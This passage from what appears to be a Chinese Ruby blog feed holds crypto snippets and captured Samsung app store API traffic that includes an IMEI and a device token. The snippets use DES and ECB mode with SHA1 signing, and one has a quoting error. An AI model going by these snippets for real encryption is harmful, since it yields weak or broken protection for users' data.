class="number">2048</span>)</span><br><span class="line">pkcs12 = OpenSSL::PKCS12.create(password, <span class="literal">nil</span>, pkey, cert)</span><br><span class="line">File.open(<span class="string">'cert.pfx'</span>, <span class="string">'w'</span>) &#123; <span class="params">|f|</span> f &lt;&lt; pkcs12.to_der &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取PKCS#12证书</span></span><br><span class="line">data = File.read(<span class="string">'cert.pfx'</span>)</span><br><span class="line">pkcs12 = OpenSSL::PKCS12.new(data, password)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Ruby </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ruby </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>密码算法-Ruby</title>
      <link href="/2016/08/17/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95-Ruby/"/>
      <url>/2016/08/17/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95-Ruby/</url>
      <content type="html"><![CDATA[<h1 id="密码算法-Ruby"><a href="#密码算法-Ruby" class="headerlink" title="密码算法-Ruby"></a>密码算法-Ruby</h1><p>本文只是对常用的一些密码算法做个汇总，方便在使用Ruby实现时查询。<br><a id="more"></a></p><h2 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h2><h3 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"></span><br><span class="line">cipher = OpenSSL::Cipher.new(<span class="string">'DES-ECB'</span>)</span><br><span class="line">cipher.encrypt()</span><br><span class="line">cipher.key = KEY</span><br><span class="line">encrypted = cipher.update(plain) + cipher.final()</span><br><span class="line"></span><br><span class="line">cipher.decrypt()</span><br><span class="line">cipher.key = KEY</span><br><span class="line">decrypt_palin = cipher.update(encrypted) + cipher.final()</span><br></pre></td></tr></table></figure><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"></span><br><span class="line">cipher = OpenSSL::Cipher.new(<span class="string">'AES-128-ECB'</span>)</span><br><span class="line">cipher.encrypt()</span><br><span class="line">cipher.key = KEY</span><br><span class="line">encrypted = cipher.update(plain) + cipher.final()</span><br><span class="line"></span><br><span class="line">cipher.decrypt()</span><br><span class="line">cipher.key = KEY</span><br><span class="line">decrypt_palin = cipher.update(encrypted) + cipher.final()</span><br></pre></td></tr></table></figure><h2 id="公钥密码"><a href="#公钥密码" class="headerlink" title="公钥密码"></a>公钥密码</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'base64'</span></span><br><span class="line"></span><br><span class="line">encrypt_cert = OpenSSL::X509::Certificate.new(File.read(<span class="string">'encrypt_cert_path'</span>))</span><br><span class="line">public_key = encrypt_cert.public_key</span><br><span class="line">c = Base64.strict_encode64(public_key.public_encrypt(m))</span><br><span class="line"></span><br><span class="line">key = encrypt_cert.key</span><br><span class="line">decrypt_m = key.private_decrypt(Base64.decode64(c))</span><br></pre></td></tr></table></figure><h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>RSA签名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'digest/sha1'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'base64'</span></span><br><span class="line"></span><br><span class="line">sign_cert = OpenSSL::PKCS12.new(File.read(sign_cert_path<span class="string">'), '</span>password<span class="string">')</span></span><br><span class="line"><span class="string">key = sign_cert.key</span></span><br><span class="line"><span class="string">digest = Digest::SHA1.hexdigest(data)</span></span><br><span class="line"><span class="string">sign = Base64.strict_encode64(key.sign('</span>sha1<span class="string">', digest))</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Ruby </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ruby </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>三星应用商店接口</title>
      <link href="/2016/08/06/%E4%B8%89%E6%98%9F%E5%BA%94%E7%94%A8%E5%95%86%E5%BA%97%E6%8E%A5%E5%8F%A3/"/>
      <url>/2016/08/06/%E4%B8%89%E6%98%9F%E5%BA%94%E7%94%A8%E5%95%86%E5%BA%97%E6%8E%A5%E5%8F%A3/</url>
      <content type="html"><![CDATA[<p>三星应用商店的接口是<code>XML</code>格式，使用<code>POST</code>方式提交，有的使用<code>HTTP</code>，有的使用<code>HTTPS</code>。<br><a id="more"></a></p><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><h3 id="首页"><a href="#首页" class="headerlink" title="首页"></a>首页</h3><p>地址：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post http://cn-ms.samsungapps.com/ods.as</span><br></pre></td></tr></table></figure></p><p>内容：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">version2</span>=<span class="string">"3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> <span class="attr">openApiVersion</span>=<span class="string">"21"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span> <span class="attr">mcc</span>=<span class="string">"460"</span> <span class="attr">mnc</span>=<span class="string">"00"</span> <span class="attr">csc</span>=<span class="string">"VZW"</span> <span class="attr">sdlVersion</span>=<span class="string">"2101"</span> <span class="attr">odcVersion</span>=<span class="string">"4.1.04-10"</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">filter</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">request</span> <span class="attr">name</span>=<span class="string">"searchProductListEx"</span> <span class="attr">id</span>=<span class="string">"2040"</span> <span class="attr">numParam</span>=<span class="string">"10"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"startNum"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"imgHeight"</span>&gt;</span>135<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"qlInputMethod"</span>&gt;</span>iqry<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"imgWidth"</span>&gt;</span>135<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"endNum"</span>&gt;</span>10<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"keyword"</span>&gt;</span>民航<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"contentType"</span>&gt;</span>all<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"qlDomainCode"</span>&gt;</span>sa<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"qlDeviceType"</span>&gt;</span>phone<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"alignOrder"</span>&gt;</span>bestMatch<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>响应：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> <span class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">id</span>=<span class="string">"2040"</span> <span class="attr">name</span>=<span class="string">"searchProductListEx"</span> <span class="attr">returnCode</span>=<span class="string">"0"</span> <span class="attr">startNum</span>=<span class="string">"1"</span> <span class="attr">endNum</span>=<span class="string">"10"</span> <span class="attr">totalCount</span>=<span class="string">"13"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">errorInfo</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">errorString</span> <span class="attr">errorCode</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">errorInfo</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span> <span class="attr">numValue</span>=<span class="string">"35"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"keyword"</span>&gt;</span>民航<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"correctedKeyword"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryName"</span>&gt;</span>生活方式<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"categoryID"</span>&gt;</span>G000013058<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productID"</span>&gt;</span>000000607315<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productName"</span>&gt;</span>航旅纵横<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"productImgUrl"</span>&gt;</span>http://img.samsungapps.com/productNew/000000607315/IconImage_20160826132045350_NEW_WEB_ICON_135_135.png<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"currencyUnit"</span>&gt;</span>元<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"price"</span>&gt;</span>0.00<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"discountPrice"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"discountFlag"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"averageRating"</span>&gt;</span>9<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"date"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"contentType"</span>&gt;</span>application<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"tnbYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"rentalYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"GUID"</span>&gt;</span>com.umetrip.android.msky.app<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"version"</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"realContentSize"</span>&gt;</span>19925480<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"versionCode"</span>&gt;</span>109<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"installSize"</span>&gt;</span>19925480<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"srchClickURL"</span>&gt;</span>|@sn=SAPS|@qh=6b0d84489ac5bb5e9ec6c0332a43bfa0|@qid=SAPS.ODC.SRCH.CJK|@q=民航|@idx=0|@tot=13|@doc=000000607315test0astor00035|@title=航旅纵横<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"linkProductYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"restrictedAge"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"loadType"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"newProductYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"sellerName"</span>&gt;</span>China TravelSky Holding Company<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"giftsTagYn"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"panelImgUrl"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"edgeAppType"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"bAppType"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"bGearVersion"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"IAPSupportYn"</span>&gt;</span>N<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"capIdList"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">name</span>=<span class="string">"shortDescription"</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>地址：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post http://cn-ms.samsungapps.com/ods.as</span><br></pre></td></tr></table></figure></p><p>内容：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">version2</span>=<span class="string">"3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> <span class="attr">openApiVersion</span>=<span class="string">"21"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span> <span class="attr">mcc</span>=<span class="string">"460"</span> <span class="attr">mnc</span>=<span class="string">"00"</span> <span class="attr">csc</span>=<span class="string">"VZW"</span> <span class="attr">sdlVersion</span>=<span class="string">"2101"</span> <span class="attr">odcVersion</span>=<span class="string">"4.1.04-10"</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">filter</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">request</span> <span class="attr">name</span>=<span class="string">"searchProductListEx"</span> <span class="attr">id</span>=<span class="string">"2040"</span> <span class="attr">numParam</span>=<span class="string">"10"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"startNum"</span>&gt;</span>11<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"imgHeight"</span>&gt;</span>135<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"qlInputMethod"</span>&gt;</span>more<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"imgWidth"</span>&gt;</span>135<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"endNum"</span>&gt;</span>13<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"keyword"</span>&gt;</span>民航<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"contentType"</span>&gt;</span>all<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"qlDomainCode"</span>&gt;</span>sa<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"qlDeviceType"</span>&gt;</span>phone<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"alignOrder"</span>&gt;</span>bestMatch<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><h3 id="APP内容"><a href="#APP内容" class="headerlink" title="APP内容"></a>APP内容</h3><p>地址：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post https://cn-ms.samsungapps.com/ods.as</span><br></pre></td></tr></table></figure></p><p>内容：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">networkType</span>=<span class="string">"0"</span> <span class="attr">version2</span>=<span class="string">"3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> <span class="attr">openApiVersion</span>=<span class="string">"21"</span> <span class="attr">deviceModel</span>=<span class="string">"SM-N900V"</span> <span class="attr">mcc</span>=<span class="string">"460"</span> <span class="attr">mnc</span>=<span class="string">"00"</span> <span class="attr">csc</span>=<span class="string">"VZW"</span> <span class="attr">sdlVersion</span>=<span class="string">"2101"</span> <span class="attr">odcVersion</span>=<span class="string">"4.1.04-10"</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">filter</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">request</span> <span class="attr">name</span>=<span class="string">"productDetailMain"</span> <span class="attr">id</span>=<span class="string">"2280"</span> <span class="attr">numParam</span>=<span class="string">"9"</span> <span class="attr">transactionId</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"srchClickURL"</span>&gt;</span>|@sn=SAPS|@qh=6b0d84489ac5bb5e9ec6c0332a43bfa0|@qid=SAPS.ODC.SRCH.CJK|@q=民航|@idx=0|@tot=13|@doc=000000607315test0astor00035|@title=航旅纵横<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"orderID"</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"stduk"</span>&gt;</span>7996060c3072254b08e62e7e35efdc71fbb8a4092039fb27ac47cf693f4587c1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"source"</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"imei"</span>&gt;</span>990004393474345<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"unifiedPaymentYN"</span>&gt;</span>Y<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"productImgWidth"</span>&gt;</span>135<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"productID"</span>&gt;</span>000000607315<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"productImgHeight"</span>&gt;</span>135<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SamsungProtocol</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>响应：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">SamsungProtocol</span> <span class="attr">version</span>=<span class="string">"5.3"</span> <span class="attr">lang</span>=<span class="string">"EN"</span> <span 